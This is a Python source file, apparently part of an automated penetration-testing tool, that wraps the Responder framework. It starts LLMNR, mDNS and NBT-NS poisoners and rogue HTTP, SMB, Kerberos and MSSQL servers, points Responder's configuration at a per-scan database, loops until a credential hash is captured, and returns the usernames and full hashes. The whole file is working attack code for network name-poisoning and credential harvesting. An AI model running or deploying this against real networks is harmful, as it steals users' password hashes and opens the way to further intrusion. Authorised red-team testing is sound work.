import configparser
import os
from threading import Thread
from argparse import Namespace
import socket
import sqlite3
import time 
import sys 
try: 
    from app.depedency import settings
    from app.depedency.utils import CreateResponderDb, color 
    from app.depedency.ThreadingServer import * 
except :
    from depedency import settings
    from depedency.utils import CreateResponderDb, color 
    from depedency.ThreadingServer import * 

TIME_TO_SLEEP = 30 

class Responder():
    def __init__(self, scan_name, list_target,interface,our_ip):
        self.scan_name = scan_name
        self.list_target = list_target
        self.interface = interface
        self.our_ip = our_ip
        self.cursor = None 
    
    def start_responder(self):
        try: 
            threads = []
            try : 
                from app.depedency.poisoners.LLMNR import LLMNR
                from app.depedency.poisoners.NBTNS import NBTNS
                from app.depedency.poisoners.MDNS import MDNS
            except:
                from depedency.poisoners.LLMNR import LLMNR
                from depedency.poisoners.NBTNS import NBTNS
                from depedency.poisoners.MDNS import MDNS

            
            threads.append(Thread(target=serve_LLMNR_poisoner, args=('', 5355, LLMNR,)))
            threads.append(Thread(target=serve_MDNS_poisoner,  args=('', 5353, MDNS,)))
            threads.append(Thread(target=serve_NBTNS_poisoner, args=('', 137,  NBTNS,)))

            if settings.Config.HTTP_On_Off:
                try: 
                    from app.depedency.servers.HTTP import HTTP
                except :
                    from app.depedency.servers.HTTP import HTTP
                
                threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 80, HTTP,)))

            if settings.Config.SMB_On_Off:
                if settings.Config.LM_On_Off:
                    try : 
                        from app.depedency.servers.SMB import SMB1LM
                    except :
                        from depedency.servers.SMB import SMB1LM
                    threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 445, SMB1LM,)))
                    threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 139, SMB1LM,)))
                else:
                    try : 
                        from app.depedency.servers.SMB import SMB1
                    except :
                        from depedency.servers.SMB import SMB1
                    threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 445, SMB1,)))
                    threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 139, SMB1,)))

            if settings.Config.Krb_On_Off:
                try : 
                    from app.depedency.servers.Kerberos import KerbUDP
                except :
                    from depedency.servers.Kerberos import KerbUDP
                threads.append(Thread(target=serve_thread_udp, args=('', 88, KerbUDP,)))
                threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 88, KerbTCP,)))

            if settings.Config.SQL_On_Off:
                try : 
                    from app.depedency.servers.MSSQL import MSSQL,MSSQLBrowser
                except :
                    from depedency.servers.MSSQL import MSSQL, MSSQLBrowser
                threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 1433, MSSQL,)))
                threads.append(Thread(target=serve_thread_udp_broadcast, args=(settings.Config.Bind_To, 1434, MSSQLBrowser,)))

            for thread in threads:
                thread.setDaemon(True)
                thread.start()

            print(color('[+]', 2, 1) + " Listening for events...")

            start_responder = True
            while start_responder:
                print("attends 30 seconde")
                time.sleep(TIME_TO_SLEEP)
                if self.one_hash_capture():
                    start_responder = False
            
            return self.extract_all_distinct_user_responder()

        except KeyboardInterrupt:
            sys.exit("\r%s Exiting..." % color('[+]', 2, 1))

    def make_settings(self):
        settings.init()
        self.modify_conf_file()
        options = self.set_options()
        settings.Config.populate(options)
        settings.Config.ExpandIPRanges()

    def init_database(self):
        CreateResponderDb()
        self.DBConnect()

    def init_threading(self):
        ThreadingUDPServer.allow_reuse_address = True
        ThreadingTCPServer.allow_reuse_address = True
        ThreadingUDPMDNSServer.allow_reuse_address = True
        ThreadingUDPLLMNRServer.allow_reuse_address = True
        ThreadingTCPServerAuth.allow_reuse_address = True

    def DBConnect(self):
        self.cursor = sqlite3.connect(settings.Config.DatabaseFile)

    def modify_conf_file(self): 
        path_conf_file = os.path.join(settings.Config.ResponderPATH,'Responder.conf') 
        if os.path.isfile(path_conf_file):
            parser = configparser.ConfigParser()
            parser.read(path_conf_file)  
            if 'Responder Core' in parser.sections():
                if 'RespondTo' in parser['Responder Core']:
                    pass 
                    # if isinstance(self.list_target,str):
                    #    parser.set('Responder Core','RespondTo',self.list_target)

                if 'Database' in parser['Responder Core']:
                    name_database = self.scan_name +'.db'
                    parser.set('Responder Core','Database',name_database)
                    
                with open(path_conf_file, 'w') as configfile:
                    parser.write(configfile)

                return {'Error': "Can't find RespondTo and Database"}
            return {'Error' : "Can't find section Responder Core"}
        return {'Error': "[!] Responder.conf doesn't exist !"}

    def set_options(self): 
        return Namespace(
            Analyze=False, 
            Interface=str(self.interface), 
            OURIP=self.our_ip, 
            ExternalIP=None, 
            Basic=False, 
            Wredirect=False, 
            NBTNSDomain=False, 
            Finger=False, 
            WPAD_On_Off=False, 
            Upstream_Proxy=None, 
            Force_WPAD_Auth=False, 
            ProxyAuth_On_Off=False, 
            LM_On_Off=False, 
            Verbose=None,
        )

    def extract_all_distinct_user_responder(self):
        list_capture_hash = []
        res = self.cursor.execute("SELECT type, module, client, user, fullhash FROM Responder WHERE UPPER(user) in (SELECT DISTINCT UPPER(user) FROM Responder) ORDER BY client")
        for row in res.fetchall():
            list_capture_hash.append({
                "type":row[0],
                'module':row[1],
                'client':row[2],
                'user':row[3],
                'fullhash':row[4]
            })
        
        return list_capture_hash
    
    # check if one hash have been captures 
    def one_hash_capture(self):
        res = self.cursor.execute("SELECT * FROM Responder WHERE UPPER(user) in (SELECT DISTINCT UPPER(user) FROM Responder) ORDER BY client")
        if len(res.fetchall()) != 0:
            return True 
            